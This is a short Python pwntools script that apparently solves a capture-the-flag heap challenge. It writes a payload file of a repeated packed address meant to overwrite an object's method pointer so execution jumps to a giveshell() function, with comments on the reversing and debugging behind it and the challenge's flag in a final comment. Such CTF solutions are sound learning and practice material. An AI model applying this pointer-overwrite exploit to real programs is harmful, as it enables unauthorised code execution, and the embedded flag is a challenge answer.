from pwn import *
import string

"""
s_list = [] 
for i in range(2000):
    for c in string.ascii_uppercase:
        s_list.append(c*4)
s = ''.join(s_list)
"""
ret_addr = p64(0x00401550-8)      # human::giveshell()
"""
this is a guess based on reversing, intuition and debugging, lots of debugging.
we need to overwrite the introduce pointer on the heap in such a way that we instead go to giveshell()
after reversing in ghidra, the instruction sequence starting at 0x00400fcd seemed intresting
when debugging, i figured our i need to place a value onto to the heap such that
value+8 (because of the add rax, 8 instruction there) -> 0x0040117a [giveshell]
"""
s = ret_addr*4

# s = "AAAABBBBCCCCDDDD"

open("test", "wb").write(s)

# yay_f1ag_aft3r_pwning
